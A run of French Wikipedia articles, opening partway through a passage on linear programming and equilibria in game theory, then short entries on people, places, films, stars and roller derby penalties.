On remarque que le problème du j2 est le "dual" du problème du j1. Ces deux problèmes peuvent donc être résolus ensemble grâce à la méthode du simplexe dual.
Notez que si formula_19 est la matrice de gain, c'est la négation de la transposée de formula_19 qui est placée dans le tableau du simplexe :
Soit la matrice :
formula_80
Le tableau devient :
Nous désirerions pivoter formula_74 et formula_75. Malheureusement, comme toujours pour les matrices de gain pour les jeux, la valeur du pivot vaut 0. Donc on doit pivoter en deux fois : premièrement pour déplacer formula_75 en haut et ensuite pour déplacer formula_74 à gauche. On inter-change alors formula_85 et formula_74 et supprimons la ligne formula_74, puis nous inter-changeons formula_88 et formula_75 et supprimons la colonne formula_75.
Maintenant, nous utilisons la règle des pivots pour la méthode du simplexe jusqu'à obtenir, par exemple :
Donc, formula_91. L'unique stratégie optimale pour le J1 vaut formula_92. L'unique stratégie optimale pour le J2 vaut formula_93.
Méthode de l'ellipsoïde.
Cette méthode a été inventée par Leonid Khatchian dans les années 1980 en Russie. L'algorithme ne permet de résoudre que la "faisabilité" du problème mais peut se poursuivre avec une recherche binaire sur la fonction objectif pour résoudre le problème d'optimisation. 
Le principe est de commencer avec une ellipse (appelée ellipsoïde pour les grandes dimensions) qui contient à coup sûr la région de "faisabilité". Ensuite, on essaye le centre de l'ellipse et on observe si des contraintes sont enfreintes. Dans la négative, on a terminé. Si oui, on regarde les contraintes enfreintes. Désormais, nous savons que la solution (si elle existe) se trouve dans au plus la moitié restante de l'ellipse. On trouve alors une nouvelle ellipse plus petite qui contient cette moitié et on répète l'opération.
On estime qu'on diminue à chaque étape le volume de l'ellipse d'au moins un facteur de formula_94 par rapport à l'ellipse originale. Donc, pour chaque n-étape, le volume diminue d'un facteur de formula_95. 
C'était le premier algorithme qui garantissait la résolution d'un programme linéaire en temps polynomial mais reste assez lent en pratique.
Algorithme de Karmarkar.
L'algorithme de Karmarka est un algorithme introduit par Narendra Karmarkar en 1984 et décrit une complexité polynomiale beaucoup plus rapide que la méthode de l'ellipsoïde en pratique. 
L’idée de base de la méthode est d’utiliser des fonctions barrières pour décrire l’ensemble des solutions qui est convexe par définition du problème. À l’opposé de l’algorithme du simplexe, cette méthode atteint l’optimum du problème en passant par l’intérieur de l’ensemble des solutions réalisables. Il utilise la méthode des points intérieurs.
Équilibre pour les jeux à n joueurs.
Prenons le célèbre exemple du dilemme du prisonnier pour introduire les jeux à somme non nulle. Nous prenons encore un jeu à 2 joueurs par simple souci de clarté dans les matrices de gains. Les concepts de ce chapitre s'appliquent pour n joueurs.
Dilemme du prisonnier
Deux prisonniers sont accusés d'un crime et chacun est confronté au choix de trahir (T) ou de rester silencieux (S). Leur choix va définir leur sentence qui se traduit par des années passées en prison. Voici la matrice de coût associée à ces choix que les prisonniers veulent minimiser :
La seule solution stable est celle où les deux prisonniers trahissent. Dans les trois autres possibilités, un prisonnier peut passer du silence à trahir et améliorer son gain. Les prisonniers n'oseront donc jamais jouer le payement 2 et 1 par peur de récolter la sentence maximale.
Solution par stratégie dominante.
Dans le jeu du prisonnier, chaque joueur détient une stratégie optimale unique, indépendante de la stratégie des autres. Un jeu qui a cette propriété a une solution par stratégie dominante.
Il est important de noter qu'une solution à stratégie dominante ne donne pas forcément le meilleur gain. Nous l'avons vu, par exemple, dans le jeu du prisonnier.
Par ailleurs, ce cas particulier où tous les joueurs ont leur propre stratégie dominante est assez rare. Peu de jeux satisfont cette propriété. La cause est que l'évaluation de la valeur formula_96 peut être très complexe, jusqu'à devenir exponentielle.
Pour les stratégies pures.
Parce que des situations de stratégies dominantes sont rares, il est nécessaire de chercher un concept de solutions plus largement applicable. Une solution acceptable selon la théorie des jeux est l'idée qu'aucun joueur, poursuivant toujours ses intérêts, ne peut améliorer individuellement sa situation sans s'écarter de sa stratégie. C'est l'idée que capture l'équilibre de Nash.
En d'autres termes, aucun joueur ne peut changer sa stratégie formula_97 en formula_98 et améliorer son payement, en supposant que chacun des autres joueurs garde sa stratégie choisie dans s. 
Nous remarquons également qu'une solution par stratégie dominante est un équilibre de Nash.
Pour les stratégies mixtes.
Désormais, les joueurs ne jouent plus leur stratégie de manière déterministe. Le problème se pose alors de comprendre comment les joueurs évaluent leur payement d'un choix probabiliste. Un joueur préférait-il un choix qui rapporte peu avec une forte probabilité, un choix qui rapporte beaucoup avec une faible probabilité ou encore un choix qui risque de faire perdre peu avec une grande probabilité ? Dans le cas des équilibres de Nash pour les stratégies mixtes, nous supposons qu'ils sont neutres par rapport au risque et qu'ils essayent uniquement de maximiser leur gain.
Pour définir ce choix de stratégie aléatoire formellement, on dit que chaque joueur peut définir une distribution de probabilité sur sa palette de choix, et que chacun choisira de manière indépendante un choix selon cette distribution de probabilité.
En 1951, Nash prouve que, sous ces conditions, tout jeu à nombre de joueurs et de stratégies mixtes fini possède un équilibre de Nash.
La classe PPAD.
Calculer un équilibre de Nash peut s'avérer, pour certains jeux, extrêmement long. Traditionnellement, les problèmes se retrouvent dans deux catégories de complexité : la classe P pour les problèmes qui ont un algorithme en temps polynomial et la classe NP-complet. Cependant, le concept de NP-complet ne peut être appliqué pour les rares problèmes "dont chaque instance possède une solution", comme les équilibres pour les jeux à nombre de joueurs et de stratégies mixtes fini. 
On démontre alors que trouver un équilibre de Nash est complet pour la classe de problème PPAD grâce au Théorème du point fixe de Brouwer. Chaque problème de cette classe partage cette même propriété que chacune de leurs instances possède une solution. PPAD est donc une sous-classe de NP qui contient les problèmes durs, les équilibres de Nash y compris.
Plusieurs algorithmes de résolution ont été proposés depuis les années 1970, mais la plupart ont des complexités inconnues. C'est pourquoi désormais, les jeux sont séparés en "classes" de jeux pour étudier les différents cas et les différentes complexités. Principalement, les recherches espèrent établir l'existence d'un algorithme sous-exponentiel - formula_99 - où n est la taille du jeu.
Équilibres de Nash approximés.
Pour les jeux à deux joueurs, les mesures de l'équilibre de Nash sont des nombres rationnels (la distribution de leur stratégie mixte) et sa solution est donc claire. Mais, selon Nash, lorsque le nombre de joueurs augmente, il ne peut y avoir que des solutions irrationnelles. Les calculs deviennent alors numériquement imprécis, c'est pourquoi on introduit le concept d'équilibre de Nash approximé.
Si un équilibre de Nash est une situation dans laquelle personne ne souhaite dévier de sa stratégie, un ϵ-équilibre de Nash est un ensemble de stratégies mixtes dans laquelle les joueurs peuvent espérer augmenter leurs gains d'au plus ϵ en changeant de stratégie. Un ϵ-équilibre de Nash n'est pertinent que si ϵ est petit.
La question se pose de savoir s'il existe un schéma d'approximation en temps polynomial pour les équilibres de Nash approximés, c'est-à-dire un algorithme qui tourne en temps polynomial en rapport à la taille du jeu, en acceptant des dépendances sur temps sur 1/ϵ.

</doc>
<doc id="9626030" url="https://fr.wikipedia.org/wiki?curid=9626030" title="Ellory Elkayem">
Ellory Elkayem

Ellory Elkayem est un réalisateur néo-zélandais né le à Christchurch.
Filmographie.
Très jeune, il travaille à des films. Après avoir acquis une formation dans une école de cinéma, il commence sa carrière en travaillant à des publicités, des clips et des émissions de télévision tel "L'Étalon noir". À cette époque, Elkayem réalise également plusieurs courts métrages en partie subventionnés par le "gouvernement de Nouvelle-Zélande".
Il se fait remarquer avec "Larger than Life", un court métrage de 13 minutes en noir et blanc, FX, rendant hommage au film d'horreur d'Hollywood des années 1950 et mettant en vedette une araignée géante et mangeuse d'hommes. Produit par Jamie Selkirk et financé par la "", "Larger than Life" obtient un certain succès auprès de la critique du Festival du film de Telluride (1998) et, plus tard, attire l'attention des producteurs d'Holywood Dean Devlin et Roland Emmerich ("Independence Day", "Godzilla", "Le Jour d'après"), qui recrutent Elkayem pour scénariser et réaliser "Arac Attack, les monstres à huit pattes", un film basé sur "Larger than Life", ayant un budget de 30 millions de dollars, mettant en vedette David Arquette, Kari Wuhrer et Scarlett Johansson et distribué par Warner Bros..
Depuis, Elkayem travaille sur des films d'horreur à petit budget tels ', ' et "".

</doc>
<doc id="9626034" url="https://fr.wikipedia.org/wiki?curid=9626034" title="Phantom Power (The Tragically Hip album)">
Phantom Power (The Tragically Hip album)



</doc>
<doc id="9626037" url="https://fr.wikipedia.org/wiki?curid=9626037" title="DGOS">
DGOS



</doc>
<doc id="9626038" url="https://fr.wikipedia.org/wiki?curid=9626038" title="Lac McKenzie (Marston)">
Lac McKenzie (Marston)

Le Lac McKenzie est un lac situé près du village de Marston en Estrie. La décharge du lac rejoint la Rivière Victoria, un affluent du Lac Mégantic, source de la Rivière Chaudière et un sous-affluent du Fleuve Saint-Laurent. 
Géographie.
Sa profondeur approximative maximum est de , sa largeur est de et sa longueur est de .

</doc>
<doc id="9626061" url="https://fr.wikipedia.org/wiki?curid=9626061" title="Martin Tenk">
Martin Tenk

Martin Tenk, né le à Ostrava, est un tireur sportif tchèque.
Carrière.
Martin Tenk participe aux Jeux olympiques de 2000 à Sydney et remporte la médaille de bronze dans l'épreuve du pistolet .

</doc>
<doc id="9626079" url="https://fr.wikipedia.org/wiki?curid=9626079" title="Johann Georg Halske">
Johann Georg Halske

Johann Georg Halske était un inventeur et industriel allemand, qui a fondé la société où a travaillé à ses débuts Werner von Siemens. Il a apporté d'importants perfectionnements aux premiers télégraphes électriques.
Biographie.
Né à Hambourg en 1814, Johann Georg Halske fit ses études secondaires au lycée berlinois du monastère franciscain. Il a d'abord exercé le métier de mécanicien de précision dans l'atelier "Boetticher et Halske", à Berlin, à partir de 1844, qui dépendait de marchés de niche. Le , il a épousé Henriette Christiane Friederike Schmidt, 26 ans, qui a rapidement attendu le premier enfant du jeune couple. 
Il a ensuite travaillé avec Boetticher pour construire pointeur télégraphe de Siemens. Par ses conversations et ses premières expériences de travail avec Werner von Siemens, il s'est rendu compte que la Prusse n'avait pas d'autre entreprise pour fournir la construction du télégraphe capable de succéder au Télégraphe optique prussien de Friedrich Clemens Gerke : elle était à la recherche d'un opérateur dans ce domaine dès la fin des années 1840, sur un marché promis une forte demande, qui verra apparaître en 1849 la ligne entre Berlin et Aix-la-Chapelle de Bernhard Wolff. 
Les succès rapides de Siemens dans la première moitié de 1847 ont convaincu Johann Georg Halske de s'associer à lui pour fonder la société "Telegraphenbauanstalt von Siemens &amp; Halske" qui deviendra par la suite l'entreprise Siemens, et qui a investi une partie des quelque thalers de son capital dans la location de locaux appropriés, carrés dans la partie arrière d'un immeuble, et le matériel d'atelier approprié. La contribution de Halske était son "talent de conception", Werner von Siemens apportant son "réseau" et ses inventions techniques.
Devenu membre de la "Commission du Télégraphe prussien" il a répondu à un appel d'offres en et décroché en août le contrat pour l'installation d'une ligne télégraphique entre Berlin et Francfort, sur , le long de ce qui était le plus long tronçon de chemin de fer à cette époque en Europe. L'achèvement rapide du projet en mars de l'année suivante et les liens étroits de la jeune entreprise avec les autorités gouvernementales et militaires prussiennes l'ont aidé à obtenir d'autres contrats. Le , sa ligne a triomphalement télégraphié à Berlin l'élection à Francfort de l'Empereur par la première assemblée nationale allemande. 
Ensuite, des désaccords avec la Commission sont rapidement apparus à l'été de 1849, en raison de lignes mal isolées qui ont provoqué des perturbations dans les communications entre Berlin et d'autres villes. En 1851, l'État prussien a annulé toutes les commandes avec Siemens &amp; Halske et mis fin à la relation d'affaires. La diversification de l'entreprise à l'étranger est ensuite devenue une source de discorde entre les fondateurs de l'entreprise. La Grande Exposition de 1851 à Londres, à Crystal Palace, a permis à la société d'effecteur ses débuts sur la scène internationale, mais elle n'y a rencontré rencontré aucun succès d'ampleur, malgré un prix décerné par l'un des organisateurs de l'événement.
En 1855, la société de Werner von Siemens et Johann Georg Halske ont construit pour la Russie une ligne de télégraphe qui part en direction de Sébastopol, mais arrivera trop tard pour le début de la Guerre de Crimée. Lorsque les hostilités sont déclenchées, elle n'est parvenue qu'à Simferopol.

</doc>
<doc id="9626080" url="https://fr.wikipedia.org/wiki?curid=9626080" title="Le futur est femme">
Le futur est femme

Le futur est femme ("") est un drame psychologique franco-ouest-germano-italien réalisé par Marco Ferreri et sorti en 1984.
Synopsis.
Anna et Gordon vivent une relation intense et harmonieuse. Ils n'ont pas d'enfants et n'en veulent pas. Anna travaille comme attachée de presse dans un centre commercial. Gordon est horticulteur. Son travail consiste à planter des arbres dans la ville. Ils passent leurs soirées ensemble à des fêtes ou dans des discothèques. Un soir, dans la discothèque, Anna vient en aide à une jeune femme qui se fait harceler par quelques jeunes garçons et, comme Malvina est sans domicile fixe, elle l'emmène chez elle. Ce qui devait être un hébergement pour une nuit s'étend toutefois à un séjour plus long, car Malvina, enceinte de six mois, s'installe dans la maison de Gordon et Anna. Tous deux sont fascinés par cette jeune femme vive et peu conventionnelle. Un ménage à trois se met en place, qui développe sa propre dynamique et dont Gordon est finalement exclu. Il est relégué au rôle de faire-valoir du duo Anna/Malvina.
Alors que le trio assiste à un concert du chanteur de rock Pierangelo Bertoli, une bousculade est provoquée par une bagarre entre des délinquants et la police. Gordon trouve la mort en tentant de protéger les deux femmes. Le lien entre les deux femmes se renforce par la suite. Elles quittent la ville, font une halte sur une plage où Malvina met au monde son enfant. Après la naissance, Anna, Malvina et l'enfant vivent un certain temps à la campagne, jusqu'à ce que Malvina prenne ses bagages, s'en aille en auto-stop et laisse son enfant sur le bras d'Anna.
Production.
Le film a été tourné en janvier/février 1984 dans différents endroits d'Italie. Les lieux de tournage étaient entre autres la discothèque Marabù à Reggio d'Émilie, le restaurant Locale delle meraviglie à San Mauro a Mare (Émilie-Romagne), le Palasport à Ferrare, l'Euromercato à Milanofiori (Milan) ainsi que Palerme et Sélinonte.
"Le futur est femme" est le deuxième film, après "Conte de la folie ordinaire" en 1981, dans lequel Marco Ferreri a collaboré avec Tonino Delli Colli, le chef opérateur de longue date de Pier Paolo Pasolini. Le film a été tourné dans un Format 35 mm en Eastmancolor. Pendant le tournage, Ornella Muti était enceinte de sa fille Carolina.
Le directeur artistique était le décorateur italien Dante Ferretti, nommé plusieurs fois aux Oscars par la suite. La musique a été orchestrée et enregistrée sous la direction de Carlo Savina. Pour la costumière Nicoletta Ercole (née en 1989), il s'agissait de la quatrième collaboration avec Marco Ferreri. Dans la discothèque, Pierangelo Bertoli chante la chanson "Eppure Soffia". Schygulla et Arestrup sont doublés dans la version italienne par Ottavia Piccolo et Carlo Marini.
Exploitation.
La première du film a eu lieu le 31 août 1984 à la Mostra de Venise, où Marco Ferreri a été nommé pour un Lion d'or. La première en Allemagne a eu lieu le 14 septembre 1984, en Italie le 15 septembre 1984. En 2008, Avanz Reco a publié un CD avec la bande originale du film. En 2012, le film a été présenté au Festival du film de Locarno dans le cadre de la série "Histoire(s) du cinéma".
Accueil critique.
Lors de la première à la Mostra de Venise, le film a suscité des rires et des sifflets, le rejet par la presse internationale spécialisée était général. Le critique du "Zeit" trouvait que le film « tombait terriblement dans le kitsch » et Harlan Kennedy des "American Cinema Papers" le qualifiait d'« éternel triangle amoureux d'une stupidité suspecte ». Dans les salles italiennes, le film fait un four.
Les critiques dans la presse allemande ont été mitigées, mais la tendance était plus positive après la sortie du DVD de 2013. Le "Lexikon des internationalen Films" a commenté : « Un pamphlet sur la supériorité du féminin et la chute du patriarcat. Le contenu est par moments incohérent, raconté sans tempérament et de manière confuse, l'histoire programmatique de Ferreri sur les rapports en mutation entre les sexes se prive de sa force éclairante ».
Falko Straub écrit dans sa critique du DVD de 2013 : « Dans "Le futur est femme", Marco Ferreri entonne une nouvelle fois en 1984 le chant du cygne de la culture occidentale et de la disparition de l'homme. [. . .] Volontairement, le drame remet en question les conventions sociales, c'est une vaste apologie du machisme, du monde merveilleux de la marchandise et de la société du plaisir des années 1980. [. . .] Une fois de plus, il montre l'homme comme un sexe faible qui travaille à sa propre abolition ».
Les critiques en France ont également été mitigées. "L'Œil sur l'écran", un site de cinéma français, le qualifie de film assez surprenant, singulier, une variation sur le thème de la place de la femme dans la société. Si Ferreri a été accusé de misogynie pour ses premiers films, il place ici la femme sur un piédestal : les femmes ont pris le contrôle de leur vie, et se sont totalement débarrassées de toutes les règles sociales. Il faut des artistes comme Ferreri, qui se situent entre prophétie et utopie, écrit la critique du "Monde", avant de faire des réflexions fondamentales sur Ferreri : « Pas en intellectuel, mais en alchimiste : il manipule la réalité pour créer son propre univers, un univers où il attire un très large public et ne le lâche plus ». Ferreri montre des situations qui nous semblent improbables et les filme en toute clarté, il fait apparaître dans ses images des abîmes du monde contemporain et montre les moyens de les surmonter.
En 2012, Olivier Père a inclus le film dans le programme du Festival du film de Locarno et l'a projeté au sein d'une série consacrée à Ornella Muti. Olivier Père écrit qu'il s'agit d' « un autre grand film programmatique du cinéaste. Utopie (moins négative que d’habitude) sur l’amour et la maternité, "Le futur est femme" propose les bases d’une nouvelle société affranchie des lois sociales et familiales, où les vrais liens ne seraient plus ceux du sang, mais ceux du cœur, [. . .] » et considère le film comme l'une des œuvres majeures du cinéma italien des années 1980.
La scénariste Dacia Maraini a déclaré dans une interview en 2017 : « À mon avis, "Le futur est femme" est un film particulier et original qui devrait être reconsidéré. Son histoire, celle d'une jeune femme qui ne peut pas garder son enfant et qui part à la recherche d'un couple à qui elle pourra le confier, est une réflexion d'une incroyable actualité [. . .]. A cela s'ajoute le fait que le film, interprété par des acteurs extraordinaires est porté par la mise en scène absolument fraîche et visionnaire de Ferreri ».

</doc>
<doc id="9626081" url="https://fr.wikipedia.org/wiki?curid=9626081" title="Croix du cimetière de Sainte-Marie-Outre-l'Eau">
Croix du cimetière de Sainte-Marie-Outre-l'Eau

La croix du cimetière de Sainte-Marie-Outre-l'Eau est une croix de cimetière en granite située sur le territoire de la commune de Sainte-Marie-Outre-l'Eau, en France.
Localisation.
La croix est située dans le département du Calvados, au sud-ouest de l'entrée de l'église de Sainte-Marie-Outre-l'Eau, dans le cimetière.
Historique.
La croix date de la première moitié du siècle. Elle est inscrite au titre des monuments historiques depuis le .

</doc>
<doc id="9626084" url="https://fr.wikipedia.org/wiki?curid=9626084" title="Walter Thurnherr">
Walter Thurnherr

Walter Thurnherr, né le à Muri (originaire de Diepoldsau), est un diplomate et homme politique suisse, membre du Parti démocrate-chrétien. Il est chancelier de la Confédération du au .
Biographie.
Origines et études.
Walter Thurnherr naît le à Muri , dans le canton d'Argovie. Il est originaire de Diepoldsau, dans le canton de Saint-Gall.
Après avoir grandi à Wohlen et fréquenté l'école cantonale d'Aarau, il étudie la physique théorique de 1983 à 1987 à l'École polytechnique fédérale de Zurich, puis les mathématiques à l'Université de Berne jusqu'en 1989.
Parcours professionnel.
Il entre dans les services diplomatiques de la Confédération, d'abord comme attaché à l'ambassade de Suisse à Moscou, puis au secrétariat politique du Département fédéral des affaires étrangères (DFAE) de 1991 à 1995, où il est l'assistant d'Édouard Brunner, et de nouveau à l'ambassade de Moscou de 1995 à 1997. Parallèlement, il représente la Suisse de 1995 à 1997 au sein du Groupe de Minsk, et de 1993 à 1997 comme assistant aux envoyés du secrétaire général de l'ONU pour la Géorgie.
De 1997 à 1999, il est conseiller personnel du conseiller fédéral Flavio Cotti avant de retourner au DFAE, où il devient secrétaire général, puis de passer au Département fédéral de l'économie, de la formation et de la recherche en 2003 et au Département fédéral de l'environnement, des transports, de l'énergie et de la communication en 2011.
Chancelier de la Confédération.
Le , il est élu chancelier de la Confédération par l'Assemblée fédérale par 230 voix (sur 246 possibles) et succède ainsi à Corina Casanova le . Son nom circule en 2017 pour succéder à Doris Leuthard au Conseil fédéral, mais il ne présente pas sa candidature. Le , il est réélu avec 219 voix. Sa réélection était soutenue par l’ensemble de la classe politique.
Il annonce le 16 août 2023 son intention de quitter son poste à la fin de l'année 2023. Un article paru à cette occasion dans "Le Temps" le classe parmi les chanceliers les plus influents de l'histoire, au même titre que Karl Huber et Walter Buser, et rapporte que sa petite taille et ses compétences lui ont valu le surnom de « Napoléon ».
Vie personnelle.
Walter Thurnherr est marié et père de deux enfants.

</doc>
<doc id="9626088" url="https://fr.wikipedia.org/wiki?curid=9626088" title="Phantom Power">
Phantom Power

 est une expression anglophone signifiant « pouvoir fantôme ». Elle peut faire référence à :

</doc>
<doc id="9626089" url="https://fr.wikipedia.org/wiki?curid=9626089" title="Martin Weiss (nazi)">
Martin Weiss (nazi)

Martin Weiss est un SS-Hauptscharführer, officier nazi, actif de 1934 à 1945, né le à Karlsruhe et mort le dans la même ville. Il est condamné à la prison à perpétuité pour crimes de guerre en 1950, avant que sa condamnation soit annulée en 1977.
Biographie.
Il est né en 1903 à Karlsruhe d'une famille protestante aisée de huit enfants. De 1923 à 1927, il part travailler en Amérique du Sud pour aider son frère propriétaire d'une ferme.
Il rejoint la "Reiter SS", une branche de la SS en 1934 en raison de son intérêt pour l'équitation puis le parti nazi (NSDAP) en 1937. En raison de son appartenance à la SS au moment de sa conscription, il est placé dans une unité de ravitaillement mécanique de la Waffen-SS, avec laquelle il participe à la bataille de France. 
En 1941, il rejoint l'Einsatzkommando 3 stationné à Bad Düben. En , il rejoint le "Sicherheitsdienst" (SD), service de renseignement et de maintien de l'ordre de la SS et la "Sicherheitspolizei" ("Sipo)," police de sécurité allemande à Vilnius dans la Lituanie occupée par le Troisième Reich. Il s'occupe des affaires juives du ghetto de Vilnius et de la prison de Lukiškės, prison de la Gestapo. Du fait de la confiance de sa hiérarchie et en dépit de son grade peu élevé, il est le chef "de facto" du ghetto. Il commande aussi jusqu'en 1943 les "Ypatingasis būrys," une unité spéciale de soldats lituaniens responsable des massacres de Ponary. Il supervise lui-même 13 à 15 exécutions sur ce site. En septembre 1943, il est choisi pour coordonner le travail du Sonderkommando 1005 afin d'effacer les preuves d'exterminations juives, c'est-à-dire de déterrer et brûler les cadavres.
Le 27 mars 1944, les enfants de moins de seize ans du camp de travail de Kailis sont arrêtés lors d'une opération ("Kinderaktion") commandée par Weiss. Ils sont emmenés à la gare ; leur sort n'est pas connu. 
En 1950, la cour de Wurtzbourg le condamne à la prison à vie pour crimes de guerre. En 1970, sa condamnation est suspendue et annulée en 1977.

</doc>
<doc id="9626093" url="https://fr.wikipedia.org/wiki?curid=9626093" title="Pascale Hugues">
Pascale Hugues

Pascale Hugues, née en à Strasbourg, est une journaliste et écrivaine française qui vit à Berlin.
Biographie.
Pascale Hugues a été correspondante du quotidien "Libération" de 1986 à 1989 à Londres et de 1989 à 1995 à Bonn et à Berlin. Depuis 1995, elle fait des reportages sur l’Allemagne pour l'hebdomadaire "Le Point". Par ailleurs, elle rédige tous les quinze jours la rubrique "Mon Berlin" pour le quotidien berlinois "Tagesspiegel". À intervalles irréguliers, elle publie également dans l'hebdomadaire "Der Spiegel".
Elle a réalisé des films pour la chaîne de télévision franco-allemande Arte. Elle a reçu le prix franco-allemand du journalisme dans les catégories télévision et presse pour le film "L'est c'est fini" sur les jeunes Est-allemands et pour le texte "In den Vorgärten blüht Voltaire" de sa chronique "Mon Berlin".
En 1998, son premier livre "Le bonheur allemand" paraît en France avec des reportages sur l’Allemagne.
En 2008, elle publie l'histoire de ses grands-mères, "Marthe et Mathilde". L’histoire vraie d'une incroyable amitié, « deux Alsaciennes, l’une française et l’autre allemande qui n’en ont pas moins vécu côte-à-côte à Colmar pendant presque tout le siècle »"."
En 2014, son livre "La Robe de Hannah, Berlin 1904-2014" est publié en France. Elle y raconte l'histoire d'une rue de Berlin, la "Schwäbische Strasse", depuis sa création en 1904. Elle relate ainsi tous les changements que Berlin a connus au cours du siècle dernier. Elle a reçu le prix du livre européen et le prix Simone-Veil pour ce livre. La traduction allemande a été publiée en 2015 sous le titre "Ruhige Straße in guter Wohnlage".
Pascale Hugues vit à Berlin. Elle est mariée avec le cinéaste allemand Thomas Kufus et a deux enfants.

</doc>
<doc id="9626096" url="https://fr.wikipedia.org/wiki?curid=9626096" title="The Inner Sanctum (album de Saxon)">
The Inner Sanctum (album de Saxon)

 est le album studio du groupe de heavy metal anglais Saxon, sorti le .
"The Inner Sanctum".
Musique de Saxon, Paroles de Biff Byford

</doc>
<doc id="9626097" url="https://fr.wikipedia.org/wiki?curid=9626097" title="Pénalité (roller derby)">
Pénalité (roller derby)

Le roller derby est un sport d'équipe de contact se pratiquant en quads sur une piste de forme ovale, le but du jeu étant pour l'un des joueurs de réussir à dépasser en un laps de temps donné (un jam) les joueurs adverses sans se faire projeter au sol ni sortir de la piste. Des pénalités peuvent être données au cours d'un jam.
Principe.
Au cours d'un jam, n'importe quelle joueuse peut recevoir une pénalité qui sera à la fois individuelle et collective : la joueuse doit servir une pénalité de 30 secondes en ' mais elle conserve également le poste qu'elle avait avant de recevoir la pénalité. Une joueuse pénalisée doit sortir immédiatement de la piste afin de rejoindre la ' en longeant le track. Chaque pénalité ne démarre que quand la joueuse s'assoit sur une chaise dans la ' et est chronométrée individuellement. La ' peut accueillir au maximum deux bloqueuses et une jammeuse de chaque équipe. Si le jam se termine alors que la pénalité n'est pas encore terminée, la joueuse restera pénalisée au début du jam suivant. 
Une joueuse qui est "" mais qui est envoyée en pénalité perd l'avantage de pouvoir arrêter le jam ; quand elle revient en jeu, elle peut continuer à inscrire des points mais ne peut pas arrêter le jam. Si les deux jammeuses sont pénalisées en même temps, elles purgeront toutes les deux le même temps en pénalité, à savoir le temps passé par la première jammeuse assise sans la seconde. Si les deux s'assoient en même temps, elles ne doivent rester que 10 secondes. Si une joueuse reçoit 7 pénalités au cours d'un match, elle est immédiatement exclue de la rencontre et une autre joueuse de son équipe doit purger la pénalité à sa place.
Types de pénalités.
Pour entraver la jammeuse de l'équipe adverse, les joueuses peuvent la bloquer à l'aide des parties du corps au-dessus de la mi-cuisse, à l'exclusion des avant-bras, des mains et de la tête. Les coudes ne peuvent pas être utilisés dans le blocage, ne peuvent pas être balancés à l'attention d'autres joueuses ou utilisés pour accrocher une adversaire ou un bras équipier. Les zones sur lesquelles un blocage peut être effectuées sont les mêmes sauf le dos. Un mouvement visant à gêner une jammeuse autour du track est considéré comme étant un blocage même s'il n'y a pas de contact entre la jammeuse et la bloqueuse. 

</doc>
<doc id="9626098" url="https://fr.wikipedia.org/wiki?curid=9626098" title="Petr Málek">
Petr Málek

Petr Málek, né le à Moravský Krumlov (Tchécoslovaquie) et mort le à Koweït (Koweït), est un tireur sportif tchèque.
Carrière.
Petr Málek participe aux Jeux olympiques de 2000 à Sydney et remporte la médaille d'argent dans l'épreuve du skeet.

</doc>
<doc id="9626113" url="https://fr.wikipedia.org/wiki?curid=9626113" title="Alexander von Fielitz">
Alexander von Fielitz

Alexander von Fielitz (né le à Leipzig – décédé le à Bad Salzungen) est un compositeur, chef d'orchestre et professeur de musique allemand.
Biographie.
Fielitz a étudié avec Julius Schulhoff et à Dresde. Il a travaillé comme chef d'orchestre de théâtre à Zurich, Lübeck, et Leipzig, et ensuite a enseigné pendant plusieurs années au Conservatoire Stern à Berlin. En 1905, il est devenu professeur au et en 1906 il a dirigé l'Orchestre symphonique de Chicago. À partir de 1908 il a de nouveau enseigné au Conservatoire Stern, qu'il a dirigé à partir de 1915.
Œuvres.
Fielitz a composé deux opéras : 
Il a composé plusieurs lieder, dont son cycle "Eliland". Ses "Toskanische Lieder" ("Lieder toscans") ont été particulièrement bien connus. Sa romance pour violon et piano était également populaire.

</doc>
<doc id="9626114" url="https://fr.wikipedia.org/wiki?curid=9626114" title="Martin Gottfried Weiss">
Martin Gottfried Weiss

Martin Gottfried Weiss est un officier nazi.
Biographie.
Il est né en 1905 à Weiden in der Oberpfalz.
Il rejoint la jeunesse hitlérienne en 1924, et la SS en 1933. Il travaille à Dachau jusqu'en . En , il participe à la construction d'un "Neuengamme KZ" près de Hambourg. 
Il est le dernier commandant du camp de Dachau.
Il est exécuté le à la prison forteresse de Landsberg-am-Lech.

</doc>
<doc id="9626117" url="https://fr.wikipedia.org/wiki?curid=9626117" title="V862 Scorpii">
V862 Scorpii

 (en abrégé V862 Sco), également désignée HD 160202, est une étoile variable de type Gamma Cassiopeiae située dans l’amas du Papillon (M6). Sa magnitude apparente varie entre 6,63 et 6,76. D'après la mesure de sa parallaxe par le satellite "Gaia", l'étoile est distante d' de la Terre.

</doc>
<doc id="9626118" url="https://fr.wikipedia.org/wiki?curid=9626118" title="BM Scorpii">
BM Scorpii

 (en abrégé BM Sco) est une étoile variable semi-régulière située dans l’amas du Papillon (M6). Sa magnitude apparente varie entre 5,25 et 6,46. D'après la mesure de sa parallaxe par le satellite "Gaia", l'étoile est distante d' de la Terre.

</doc>
<doc id="9626125" url="https://fr.wikipedia.org/wiki?curid=9626125" title="Ranfurly (Écosse)">
Ranfurly (Écosse)

Ranfurly ("Rann Feòirling" en gaélique ) est un village d'Écosse, situé dans le council area et région de lieutenance du Renfrewshire, situé en banlieue de Paisley. Il se trouve plus précisément dans la vallée du Strathgryfe, immédiatement au sud de Bridge of Weir.

</doc>
<doc id="9626128" url="https://fr.wikipedia.org/wiki?curid=9626128" title="Stolzenau">
Stolzenau

Stolzenau est une commune de l'arrondissement de Nienburg/Weser en Basse-Saxe. Ce chef-lieu d’agglomération ("Samtgemeinde Mittelweser") est traversé par la Weser.
Géographie.
Stolzenau est une petite ville de la moyenne vallée de la Weser, succession de marais maritimes et de "geest" (bocages). Elle se trouve au sud-ouest du chef-lieu d'arrondissement, Nienburg/Weser, en rive gauche du fleuve.
Communes voisines.
La commune est limitrophe au nord du village de Steyerberg et à l'est des communes de Landesbergen et de Leese. Au sud-est, la limite coïncide avec celle du Land de Rhénanie-du-Nord-Westphalie (Arrondissement de Minden-Lübbecke, Petershagen) et au sud-ouest et à l'ouest, avec celles de l'agglomération de Uchte.
Depuis la réforme administrative du , la commune de Stolzenau regroupe plusieurs faubourgs :
Histoire.
La découverte d'un tumulus en 2008 entre Stolzenau et Müsleringen montre que la région est habitée dès le Néolithique.
En 1346, les comtes de Hoya construisent leur château fort non loin d'un village autour duquel s'agrandit Stolzenau.
